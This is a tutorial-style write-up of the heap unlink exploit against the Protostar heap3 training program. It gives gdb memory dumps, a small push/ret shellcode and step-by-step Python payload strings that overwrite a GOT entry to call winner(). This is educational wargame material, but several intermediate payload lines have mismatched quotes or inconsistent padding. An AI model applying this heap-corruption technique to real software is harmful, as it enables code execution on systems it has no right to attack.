## Unlink
> understanding unlink exploit in heap  
:syringe: Learned and noted for everyone :syringe:

**:notebook: Bins and Chunks :notebook:**

 - we need to know about of bins to understand unlink exploit
 - a bin is a list of free'd chunks
	 - fast bin
	 - unsorted bin
	 - small bin
	 - large bin
 - fast bin maintains sinlgy-linlist 
 - when small & large bin free'd , end up in unsorted bin
 - small & large bins maintain doubly-linklist

**:pill: heap3.c source code from protostar :pill:**

```
#include <stdlib.h>  
#include <unistd.h>  
#include <string.h>  
#include <sys/types.h>  
#include <stdio.h>

void winner()  
{  
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));  
}

int main(int argc, char **argv)  
{  
  char *a, *b, *c;

  a = malloc(32);  
  b = malloc(32);  
  c = malloc(32);

  strcpy(a, argv[1]);  
  strcpy(b, argv[2]);  
  strcpy(c, argv[3]);

  free(c);  
  free(b);  
  free(a);

  printf("dynamite failed?\n");  
}
```
:scroll: :scroll: :scroll: definitions :scroll: :scroll: :scroll:

 - allocated 3 character pointers on the heap memory
 - copied user input to this chunks respectively
 - and then free'd in reverse order
 - and then print for a purpose ( u will see later ) 
 - it has winner function and we need to call this function by exploiting it
 - this program is allocating 32 bytes , remember a chunk is smaller than **64 bytes**, its **fast bin** and **ignoring fd and bk** because singly-linklist

:hammer: :hammer: :hammer: Testing the program :hammer: :hammer: :hammer:

    $ ./heap3 AAAA BBBB CCCC
    dynamite failed?

:mag: :mag: :mag: Debugging in gdb :mag_right: :mag_right: :mag_right:

 - `gdb -q heap3` -> load the program within gdb
 - `set disassembly-flavor intel` -> setting disassenbly result to intel
 - `set pagination off` -> setting gdb screen size to better height 
 - `break *main+136` -> set a breakpoint at first free
 - `run AAAA BBBB CCCC` -> run program to view heap address
 - `info proc map` -> view heap address `0x804c000`

defining gdb hook 
```
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/32x 0x804c000
>x/2i $eip
>end
```
 - `run AAAA BBBB CCCC` -> run again to view heap chunks

```
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
```
 - `0x29 = 41` -> 40 bytes and 1 is set to flag `prev_inuse`
 - `40 - 4 ( prev_chunk_size ) - 4 ( current_chunk_size ) = 32 bytes`

result after free'd

```
0x804c000:      0x00000000      0x00000029      0x0804c028      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x0804c050      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
``` 
 - when we free'd , only fd is saved in chunks because these are fast bins
 - `0x0804c028`,  `0x0804c050` 

**Freeing**

 - f there are free chunks adjacent to the chunk being freed , `free` will consolidate them into a larger free chunk
 - Free chunks are stored in a double-linked list ( ignored fast bin )

```
if( next adjacent chunk is free ){  
  unlink next adjacent chunk;  
  increase the size of the current chunk to include next adjacent chunk;  
}

if( previous adjacent chunk is free ){  
  unlink previous adjacent chunk;  
  increase the size of the previous adjacent chunk to include the current chunk;  
}
```
Figure 1

![enter image description here](https://github.com/LunaM00n/LOL-Sec-Collection/raw/master/Notes/the-heap/images/free_demo.png)  
where , 

 - free chunk ( `P` ) 
 - next chunk = ( `FD` ) 
 - prev chunk = ( `BK` )

**unlink macro**

```
#define unlink(P, BK, FD) { \  
  FD = P->fd;               \  
  BK = P->bk;               \  
  FD->bk = BK;              \  
  BK->fd = FD;              \  
}
```
 - When a chunk is unlinked it makes the next free chunk `P->fd` and the previous free chunk `P->bk` point at each other

Figure 2

![enter image description here](https://github.com/LunaM00n/LOL-Sec-Collection/raw/master/Notes/the-heap/images/unlink%20demo.png)  
where,
 - free chunk ( `P` ) 
 - next chunk = ( `FD` ) 
 - prev chunk = ( `BK` )
 - `FD->bk = BK`
 - `BK->fd = FD`

**Exploit Idea**
 
  - `unlink` basically writes the value of `P->bk` to the memory at address `(P->fd)+12` and the value of `P->fd` to the memory at address `(P->bk)+8`
	  - `FD->bk = BK`
	  - `[4141] = 3030`
	  - `[GOT] = winner`
 - we have 3 chunks, we will try to control third chunk via second chunk
	 - third chunk must be transformed into free'd chunk
	 - the address of memory 4 bytes that we want to write ( `address-12` ) , must be in `fd` of the third chunk
	 - the 4 bytes that we want to write must be in `bd`  of the third chunk
	 - the whole thing must be trigerred when second chunk is free'd
 - we need to create fake chunk that are larger than fast bin
	  - the address that we want to control is GOT address
	 - `x/3i 0x8048790` and `x/x 0x804b128` -> GOT address
- the 4 bytes we want to write is winnder address
	- `p winner` or `disas winner` -> `0x8048864` winner address

**Payload** 

first chunk = [ AAAA ] 
second chunk = [ prev_size + size + junk + shellcode + junk ] 
third chunk = [ -4 + -4 + junk + ( got address - 12 ) + shellcode address ]
 
 - by changing previous chunk size and chunk size for third chunk will corrupt metadata of the chunk

:grey_question: First chunk :grey_question:

```
$(python -c 'print "AAAA "')
```
:grey_question: Second Chunk :grey_question:

 - payload to be written for second chunk
	 - `16 bytes` junk +`6 bytes` of shellcode + `10 bytes` of useless data = 32 bytes
	 - `4 bytes` of useless data ( prev_chunk_size for third chunk )
	 - `4 bytes` of third chunk's size
 - `push 0x8048864` -> push winner address to stack
 - `ret` -> top of the stack's value as next instruction pointer
 - use [Online Diassembler/Assembler](http://shell-storm.org/online/Online-Assembler-and-Disassembler/)
 - we got shellcode as `"\x68\x64\x88\x04\x08\xc3"` < 8 bytes

```
$(python -c 'print "AAAA "+"\xff"*10'+"\x68\x64\x88\x04\x08\xc3"+"\xff"*10')
```
 - `0xfffffffc = -4 ` -> negative value larger than 64 bytes
```
$(python -c 'print "AAAA "+"\xff"*10'+"\x68\x64\x88\x04\x08\xc3"+"\xff"*10+"\xfc\xff\xff\xff"*2')
```
 
:grey_question: Third chunk :grey_question:

 - payload to be written for third chunk
	 - `4 bytes` of useless data + ( `4 bytes` of got address - `12` ) + `4 bytes` of shellcode address
	 - `"\xff"*4` + `0x804b128-12 = 0x804b11c` +  `\x40\xc0\x04\x08`

```
$(python -c 'print "AAAA "+"\xff"*10'+"\x68\x64\x88\x04\x08\xc3"+"\xff"*10+"\xfc\xff\xff\xff"*2'+" "+"\xff"*4+"\x1c\xb1\x04\x08"+"\x40\xc0\x04\x08"')
```
:grey_question: Before Free :grey_question:
```
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0xffffffff      0xffffffff
0x804c050:      0xfffffffc      0xfffffffc      0xffffffff      0x0804b11c
0x804c060:      0x0804c040      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
```
:grey_question: Free'd third chunk :grey_question:

```
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0x0804b11c      0xfffffff8
0x804c050:      0xfffffffc      0xfffffffc      0xfffffff9      0x0804b194
0x804c060:      0x0804b194      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
```
- `0x0804b11c` is written in second chunk

:grey_question: Free'd second chunk :grey_question:

```
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0x0804b11c      0xfffffff8
0x804c050:      0xfffffffc      0xfffffffc      0xfffffff9      0x0804b194
0x804c060:      0x0804b194      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
```
 - free'd but no fd value because of unlink
 
:grey_question: Free'd first chunk :grey_question:

```
0x804c000:      0x00000000      0x00000029      0x0804c028      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0x0804b11c      0xfffffff8
0x804c050:      0xfffffffc      0xfffffffc      0xfffffff9      0x0804b194
0x804c060:      0x0804b194      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
```
 - `0x0804c028` saved as fd

:fire: :fire: :fire: Final :fire: :fire: :fire:

```
$ ./heap3 $(python -c 'print "AAAA "+"\xff"*16+"\x68\x64\x88\x04\x08\xc3"+"\xff"*10+"\xfc\xff\xff\xff"*2+" "+"\xff"*4+"\x1c\xb1\x04\x08"+"\x40\xc0\x04\x08"')
that wasn't too bad now, was it? @ 1544818409
```

Have fun! :v: :v: :v:

---
**:muscle: References :muscle:**  

all resources listed here :point_right: [LOL-Fav](http://location-href.com/lol-fav/)  :page_facing_up:

:snowman: Contributed and maintained by [Luna-](https://twitter.com/art0flunam00n)  
:snowflake: Powered by [Legion of LOL](http://location-href.com)
